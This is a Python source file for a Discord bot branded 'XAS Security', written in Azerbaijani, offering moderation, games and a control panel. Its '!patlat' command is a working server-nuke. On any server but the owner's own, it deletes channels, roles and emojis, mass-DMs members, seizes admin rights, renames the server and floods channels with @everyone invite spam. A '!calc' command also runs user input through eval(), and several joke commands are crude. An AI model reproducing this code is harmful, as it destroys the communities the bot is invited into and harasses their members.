import asyncio
import os
import random
from datetime import timedelta
import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

XAS_COLOR = discord.Color.dark_red()
SAHIB_ID = 641014966312501259        # Sənin Discord ID-n
GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan serverinin ID-si

user_levels = {}
afk_users = {}
spam_kontrol = {}

@bot.event
async def on_ready():
    print(f"[{bot.user}] Uğurla işə düşdü! XAS Security aktivdir.")
    await bot.change_presence(activity=discord.Game(name="!panel | XAS Security"))

@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.author.id == SAHIB_ID or message.author.guild_permissions.administrator:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = asyncio.get_event_loop().time()
    icerik = message.content

    if author_id not in spam_kontrol:
        spam_kontrol[author_id] = []

    spam_kontrol[author_id] = [t for t in spam_kontrol[author_id] if simdi - t < 5]
    spam_kontrol[author_id].append(simdi)

    is_random_spam = len(icerik) >= 5 and sum(1 for c in icerik if not c.isalnum()) / len(icerik) > 0.6

    if len(spam_kontrol[author_id]) >= 4 or is_random_spam:
        try:
            await message.delete()
            await message.channel.timeout(message.author, timedelta(minutes=5), reason="Spam Qoruması")
            warn = await message.channel.send(f"⚠️ {message.author.mention}, çox sürətli mesaj yazırsan (Spam Qoruması)!")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    words = icerik.split()
    if len(words) >= 13 and words.count(words[0]) >= len(words) * 0.5:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, təkrarlanan mesaj spamı!")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    icerik_lower = icerik.lower()
    if author_id in afk_users:
        del afk_users[author_id]
        try:
            msg = await message.channel.send(f"👋 {message.author.mention}, AFK rejimindən çıxdın.")
            await asyncio.sleep(5)
            await msg.delete()
        except:
            pass

    for mention in message.mentions:
        if mention.id in afk_users:
            sebep = afk_users[mention.id]
            try:
                msg = await message.channel.send(f"⚠️ Etiketlədiyiniz istifadəçi AFK-dır! Səbəb: {sebep}")
                await asyncio.sleep(5)
                await msg.delete()
            except:
                pass

    if "gg/" in icerik_lower or "discord.gg/" in icerik_lower or "https://" in icerik_lower:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, link paylaşmaq qadağandır!")
            await asyncio.sleep(5)
            await warn.delete()
            return
        except:
            pass

    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}

    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 300

    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}! Səviyyə atladın: **{user_levels[author_id]['level']}**")
        except:
            pass

    await bot.process_commands(message)

# ==========================================
# İDARƏETMƏ VƏ ƏSAS KOMUTLAR
# ==========================================
class XASMenyu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="1. Təhlükəsizlik və Nuke", description="Anti-Bot & Anti-Webhook, Nuke və Patlat komutları"),
            discord.SelectOption(label="2. Moderasiya və İdarəetmə", description="Kanal idarəsi, Cəza dəriləri (Ban, Kick, Timeout)"),
            discord.SelectOption(label="3. Əyləncə, Oyunlar və Alətlər", description="Əyləncəli komutlar, Oyunlar, Şəkil və Səviyyə"),
            discord.SelectOption(label="4. XAS Xüsusi URL & Sistem", description="Real-time Dəvət Məlumatı, URL və Sistem ayarları")
        ]
        super().__init__(placeholder="XAS İdarəetmə Menyusundan Bölüm Seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0].startswith("1"):
            embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", color=XAS_COLOR)
            embed.add_field(name="Anti-Bot & Anti-Webhook", value="İcazəsiz bot və webhook yaranmasının qarşısını alır.")
            embed.add_field(name="Anti-Spam & Flood", value="Random və sürətli spamı avtomatik bloklayır.")
            embed.add_field(name="Nuke & Patlat", value="🔥 Patlat komutu ilə serveri tam təmizləyir.")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0].startswith("2"):
            embed = discord.Embed(title="⚙️ Moderasiya Paneli", color=XAS_COLOR)
            embed.add_field(name="Kanal Dəriləri", value="!lock / !unlock / !hide / !reveal")
            embed.add_field(name="Cəza Dəriləri", value="!ban / !kick / !timeout / !clear")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0].startswith("3"):
            embed = discord.Embed(title="🎮 Əyləncə və Oyunlar", color=XAS_COLOR)
            embed.add_field(name="Xüsusi Barlar", value="!sex, !fuck, !kiss, !roll, !coinflip")
            embed.add_field(name="Akillı & API & Level", value="!iq, !gay, !handsome, !love, !slot, !level")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0].startswith("4"):
            embed = discord.Embed(title="🌐 XAS Xüsusi URL & Sistem", color=XAS_COLOR)
            embed.add_field(name="Rəsmi Dəvət Məlumatı", value="!url & !seturl ilə vanity url idarəsi.")
            await interaction.response.edit_message(embed=embed)

class XASView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(XASMenyu())

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(
        title="✨ XAS İDARƏETMƏ PANELİ",
        description="Aşağıdakı açılan menyudan istədiyiniz kateqoriyanı seçin.",
        color=XAS_COLOR
    )
    embed.set_footer(text="XAS Security & Management System")
    await ctx.send(embed=embed, view=XASView())

@bot.command(name="url")
async def server_url(ctx):
    secilen_link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url_code else "Mövcud deyil"
    toplam_istifade = 0
    if ctx.guild.vanity_url:
        try:
            vanity = await ctx.guild.vanity_invite()
            toplam_istifade = vanity.uses
        except:
            pass

    embed = discord.Embed(
        title=f"🌐 {ctx.guild.name} - Real Dəvət Statistikası",
        description="Serverin anlıq olaraq bazadan çəkilən rəsmi dəvət məlumatları.",
        color=XAS_COLOR
    )
    embed.add_field(name="🔗 Aktiv Dəvət Linki", value=secilen_link, inline=False)
    embed.add_field(name="📊 Anlıq İstifadə Sayı", value=str(toplam_istifade), inline=False)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text=f"Sorgulayan: {ctx.author.name} | XAS Real-time Sistem")
    await ctx.send(embed=embed)

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    await ctx.message.delete()
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bu əmri istifadə etmək üçün yetkiniz yoxdur!", delete_after=5)
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Serverin xüsusi URL-i uğurla dəyişdirildi: **{yeni_url}**")
    except Exception as e:
        await ctx.send(f"❌ Xəta baş verdi: Botun icazəsi çatmır və ya URL yanlışdır.", delete_after=5)

@bot.command(name="ping")
async def ping(ctx):
    lat = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Gecikmə müddəti: **{lat}ms**")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🛡️ {g.name} - Server Məlumatları", color=XAS_COLOR)
    embed.add_field(name="👑 Sahib", value=str(g.owner), inline=True)
    embed.add_field(name="👥 Üzv Sayı", value=str(g.member_count), inline=True)
    embed.add_field(name="📁 Kanal Sayı", value=str(len(g.channels)), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} Haqqında", color=XAS_COLOR)
    embed.add_field(name="🆔 İstifadəçi ID", value=m.id, inline=True)
    embed.add_field(name="📅 Qoşulduğu Tarix", value=m.joined_at.strftime('%Y-%m-%d'), inline=True)
    if m.display_avatar:
        embed.set_thumbnail(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} - Avatar", color=XAS_COLOR)
    if m.display_avatar:
        embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="level")
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 **{m.name}** - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: {sebep}")

@bot.command(name="çekiliş")
async def cekilis_cmd(ctx, sure_dakika: int, *, mukafat: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="🎉 ÇEKİLİŞ VAR!", description=f"Mükafat: **{mukafat}**\nQatılmaq üçün 🎉 emojisinə basın!", color=XAS_COLOR)
    embed.set_footer(text=f"Müddət: {sure_dakika} dəqiqə")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎉")
    await asyncio.sleep(sure_dakika * 60)
    
    yeni_msg = await ctx.channel.fetch_message(msg.id)
    for reaction in yeni_msg.reactions:
        if str(reaction.emoji) == "🎉":
            users = [user async for user in reaction.users() if not user.bot]
            if users:
                kazanan = random.choice(users)
                await ctx.send(f"🏆 Təbriklər {kazanan.mention}! **{mukafat}** qazandın!")
            else:
                await ctx.send("❌ Çekilişə heç kim qatılmadı.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmaya bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Bu kanal yazışmaya açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("🙈 Bu kanal gizlətildi.")

@bot.command(name="reveal")
async def reveal_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("👁️ Bu kanal yenidən göstərildi.")

@bot.command(name="hideall")
async def hideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    tasks = [ch.set_permissions(ctx.guild.default_role, view_channel=False) for ch in ctx.guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("🔒 Bütün kanallar gizlətildi.")

@bot.command(name="revealall")
async def revealall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    tasks = [ch.set_permissions(ctx.guild.default_role, view_channel=True) for ch in ctx.guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("🔓 Bütün kanallar açıldı.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş mod **{seconds}** saniyə edildi.")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 **{member.name}** ban edildi! Səbəb: {reason}")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 **{member.name}** atıldı! Səbəb: {reason}")

@bot.command(name="timeout")
async def timeout_cmd(ctx, member: discord.Member, minutes: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.moderate_members:
        return
    await member.timeout(timedelta(minutes=minutes), reason="Mute")
    await ctx.send(f"🔇 **{member.name}** **{minutes}** dəqiqə mute olundu.")

@bot.command(name="clear")
async def clear_cmd(ctx, amount: int = 5):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_messages:
        return
    deleted = await ctx.channel.purge(limit=amount)
    msg = await ctx.send(f"🧹 **{len(deleted)}** ədəd mesaj silindi.")
    await asyncio.sleep(3)
    await msg.delete()

@bot.command(name="giverole")
async def giverole_cmd(ctx, member: discord.Member, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    await member.add_roles(role)
    await ctx.send(f"✅ **{member.name}** istifadəçisinə **{role.name}** rolu verildi.")

@bot.command(name="takerole")
async def takerole_cmd(ctx, member: discord.Member, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    await member.remove_roles(role)
    await ctx.send(f"❌ **{member.name}** istifadəçisindən **{role.name}** rolu alındı.")

@bot.command(name="sex")
async def sex_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə çox isti anlar yaşandı!")
    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjFkPTc5MGI3NjExZnd2aXJ3YmZrczVjM3RvdGlnMGN2bTZwOGx6Z3Axb2E2ZDNwMm84ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPnAiaMCws8nOsE/giphy.gif")
    await ctx.send(embed=embed)

@bot.command(name="fuck")
async def fuck_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** hərəkətə keçdi!")
    embed.set_image(url="https://images.unsplash.com/photo-1518199266791-5375a83190b7")
    await ctx.send(embed=embed)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(description=f"💋 **{ctx.author.name}**, **{m.name}** adlı şəxsi öpdü.")
    await ctx.send(embed=embed)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip")
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Pər"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 **{m.name}** IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 **{m.name}** Gay Oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome")
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 **{m.name}** Yaraşıqlılığı: **%{random.randint(50, 100)}**")

@bot.command(name="love")
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    n2 = member2 or ctx.author
    await ctx.send(f"❤️ **{member1.name}** və **{n2.name}** uyğunluğu: **%{random.randint(0, 100)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 **{m.name}** hack olunur...")
    await asyncio.sleep(2)
    await msg.edit(content=f"🔓 IP: `192.168.1.{random.randint(10, 99)}` - Hackləndi!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🍇', '💎', '⭐']
    c1, c2, c3 = random.choice(semboller), random.choice(semboller), random.choice(semboller)
    if c1 == c2 == c3:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Təbriklər, **Jackpot** qazandın!")
    elif c1 == c2 or c2 == c3 or c1 == c3:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Pis değil, 2 eyni simvol.")
    else:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Uduzdun, yenidən sına.")

@bot.command(name="8ball")
async def ball_cmd(ctx, *, soru):
    cavablar = ["Bəli, mütləq.", "Şübhəsiz ki, hə.", "Gələcək qaranlıqdır.", "Xeyr, əsla."]
    await ctx.send(f"🎱 Soru: {soru} \n💬 Cavab: {random.choice(cavablar)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{res}**")
    except:
        await ctx.send("❌ Xəta! İfadəni düzgün yazın.")

@bot.command(name="joke")
async def joke_cmd(ctx):
    jokes = [
        "Kompyuter niyə soyuducana gəldi? İtki pancarası açıq qoymuşduq.",
        "Tamirçi niyə yoruldu? Çünki ziddən deyirlər.",
        "Müəllim şagirdə: - De görüm, Nəsimi harada anadan olub? Şagird: - Proqramçı dostuna deyir: 'Həyatım eyni kod kimidir, səhvlərlə doludur.'"
    ]
    await ctx.send(f"😅 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps")
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("❌ Seçim: daş, kağız və ya qayçı!")
        return
    if cho == bot_choice:
        await ctx.send(f"🤝 Heç-heçə! Mən də {bot_choice} seçmişdim.")
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        await ctx.send(f"🎉 Mən qazandım! Mənim seçimim: {bot_choice}")
    else:
        await ctx.send(f"🏆 Sən qazandın! Mənim seçimim: {bot_choice}")

@bot.command(name="poll")
async def poll_cmd(ctx, *, soru):
    await ctx.message.delete()
    embed = discord.Embed(title=f"📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorgunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# ==========================================
# PATLAT / NUKE SİSTEMİ (Qoruma daxil)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    await ctx.message.delete()
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu server əsas qorunan serverdir!")
        return

    await ctx.send("🔥 discord.gg/aga - SPAWN NUKE BAŞLADI!")

    # 1. Səs kanalından çıxarma və ləqəb dəyişmə
    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            try:
                if member.voice:
                    await member.move_to(None)
                await member.edit(nick="discord.gg/aga")
            except:
                pass

    # 2. Emojiləri sil
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    # 3. Stickerləri sil
    for sticker in list(guild.stickers):
        try:
            await sticker.delete()
        except:
            pass

    # 4. DM Spam funksiyası
    async def send_user_dm(member):
        try:
            await member.send("RUHUM SKDİ !discord.gg/aga'n YAZ GİR")
        except:
            pass

    dm_tasks = [send_user_dm(member) for member in guild.members if not member.bot]
    if dm_tasks:
        await asyncio.gather(*dm_tasks, return_exceptions=True)

    # 5. Mövcud kanalları sil
    channel_tasks = [ch.delete() for ch in guild.channels]
    if channel_tasks:
        await asyncio.gather(*channel_tasks, return_exceptions=True)

    # 6. Rolları sil
    role_tasks = [r.delete() for r in guild.roles if r != guild.default_role]
    if role_tasks:
        await asyncio.gather(*role_tasks, return_exceptions=True)

    # 7. Yeni rol yarat və sahibə ver
    try:
        yeni_rol = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(yeni_rol)
    except:
        pass

    # 8. Server adını dəyiş
    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    # 9. Vanity URL dəyişməsi
    vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumuntesi"]
    for v_code in vanity_alternatifleri:
        try:
            await guild.edit(vanity_code=v_code)
            break
        except:
            pass
    # 10. Ən üstdə RUHUM-TANRI kanalını aç və spam et
    try:
        ruhum_kanal = await guild.create_text_channel("RUHUM-TANRI")
        async def ruhum_spam():
            for _ in range(300):
                try:
                    await ruhum_kanal.send("@everyone ruhum shdı discord.gg/aga")
                    await asyncio.sleep(0.05)
                except:
                    break
        asyncio.create_task(ruhum_spam())
    except:
        pass

    # 11. Digər kanalları yaradıb hər birinə mesaj göndərmək
    async def kanal_islem_ve_spam(i):
        try:
            channel = await guild.create_text_channel(f"aga-spam-{i}")
            for _ in range(50):
                try:
                    await channel.send("@everyone discord.gg/aga yaz gır oql")
                    await asyncio.sleep(0.05)
                except:
                    break
        except:
            pass

    chunk_size = 5
    for start in range(1, 41, chunk_size):
        tasks_list = [kanal_islem_ve_spam(i) for i in range(start, min(start + chunk_size, 41))]
        await asyncio.gather(*tasks_list, return_exceptions=True)
        await asyncio.sleep(0.1)

# Botun işə düşməsi (Token hissəsi)
if __name__ == "__main__":
    bot.run(os.getenv("TOKEN"))
    
